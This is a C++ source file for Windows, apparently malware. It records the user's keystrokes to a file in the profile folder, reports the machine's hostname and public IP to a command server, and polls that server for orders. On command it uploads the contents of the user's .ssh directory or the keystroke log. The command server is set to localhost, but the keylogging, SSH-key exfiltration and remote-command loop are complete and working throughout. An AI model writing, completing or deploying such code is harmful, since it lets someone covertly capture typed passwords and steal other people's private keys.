#include <iostream>
#include <curl/curl.h>
#include <windows.h>
#include <boost/asio.hpp>
#include <boost/filesystem.hpp>
#include <fstream>
#include <thread>
#include <array>

using boost::asio::ip::tcp;
std::array<bool, 256> key_states;

// Fonction pour enregistrer les touches dans un fichier

void log_to_file(const std::string& file_path) {
    std::ofstream file(file_path, std::ios::app);
    if (!file) {
        throw std::runtime_error("Error opening file " + file_path);
    }

    std::string typedChar;

    // Initialize key states
    for (int key = 0; key < 256; ++key) {
        key_states[key] = false;
    }

    while (true) {
        Sleep(10);

        for (int key = 32; key <= 126; key++) {
            // Check if key is currently down
            bool key_down = GetAsyncKeyState(key) & 0x8000;

            // If key is currently down, but was not down last frame, record the key press
            if (key_down && !key_states[key]) {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                WCHAR unicodeChar;
                if (ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, &unicodeChar, 1, 0) == 1) {
                    typedChar = static_cast<char>(unicodeChar);
                    file << typedChar;
                    file.flush();
                }
            }

            // Update key state for next frame
            key_states[key] = key_down;
        }
    }
}




void send_file(const std::string& file_path, const std::string& url, const std::string& id) {
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();
    if (!curl) {
        throw std::runtime_error("Error initializing cURL");
    }
    std::ifstream file(file_path, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Error opening file " + file_path);
    }
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: multipart/form-data");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    struct curl_httppost* post = NULL;
    struct curl_httppost* last = NULL;
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, file_path.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "id", CURLFORM_COPYCONTENTS, id.c_str(), CURLFORM_END);
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        throw std::runtime_error("Error sending file " + file_path + ": " + curl_easy_strerror(res));
    }
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
}

void fonction2(const std::string& id) {
    char* pValue;
    size_t len;
    errno_t err = _dupenv_s(&pValue, &len, "USERPROFILE");
    if (err) {
        // Handle error here
    }
    else {
        std::string file_path = std::string(pValue) + "/text.txt";
        std::string url = "http://localhost:8080/upload";
        try {
            send_file(file_path, url, id);
            remove(file_path.c_str()); // Supprimer le fichier après l'envoi
            std::ofstream file(file_path); // Recréer le fichier
            file.close();
        }
        catch (const std::exception& e) {
            std::cerr << "Error sending file " << file_path << ": " << e.what() << std::endl;
        }
        free(pValue);
    }
}

void fonction1(const std::string& id) {
    std::cout << "La fonction" << std::endl;

    char* pValue;
    size_t len;
    errno_t err = _dupenv_s(&pValue, &len, "USERPROFILE");
    if (err) {
        // Handle error here
    }
    else {
        std::string directory_path = std::string(pValue) + "/.ssh";
        std::string url = "http://localhost:8080/upload";

        for (auto& file : boost::filesystem::directory_iterator(directory_path)) {
            if (boost::filesystem::is_regular_file(file)) {
                try {
                    send_file(file.path().string(), url, id);
                }
                catch (const std::exception& e) {
                    std::cerr << "Error sending file " << file.path().string() << ": " << e.what() << std::endl;
                }
            }
        }

        free(pValue);
    }
}

size_t write_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    std::string* response = reinterpret_cast<std::string*>(userdata);
    response->append(ptr, size * nmemb);
    return size * nmemb;
}

std::string get_public_ip() {
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();
    if (curl) {
        std::string response_str;
        std::string url = "https://api.ipify.org";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_str);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            throw std::runtime_error("Error getting public IP: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_cleanup(curl);
        return response_str;
    }
    else {
        throw std::runtime_error("Error initializing cURL");
    }
}


int main(int argc, char** argv) {
    char* pValue;
    size_t len;
    errno_t err = _dupenv_s(&pValue, &len, "USERPROFILE");
    if (err) {
        // Handle error here
    }
    else {
        std::string file_path = std::string(pValue) + "/text.txt";
        std::thread log_thread(log_to_file, file_path);
        log_thread.detach();
        free(pValue);
    }

    std::string url = "http://localhost:8080/status";
    std::string id = boost::asio::ip::host_name();
    std::string ip = get_public_ip();
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    struct curl_httppost* post = NULL;
    struct curl_httppost* last = NULL;
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "id", CURLFORM_COPYCONTENTS, id.c_str(), CURLFORM_END);
    curl_formadd(&post, &last, CURLFORM_COPYNAME, "ip", CURLFORM_COPYCONTENTS, ip.c_str(), CURLFORM_END);
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
    std::string response_data;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
    while (true) {
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if (response_code == 200) {
                if (response_data == "1") {
                    fonction1(id);
                }
                else if (response_data == "2") {
                    fonction2(id);
                }
            }
            response_data.clear();
        }
        Sleep(2000);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
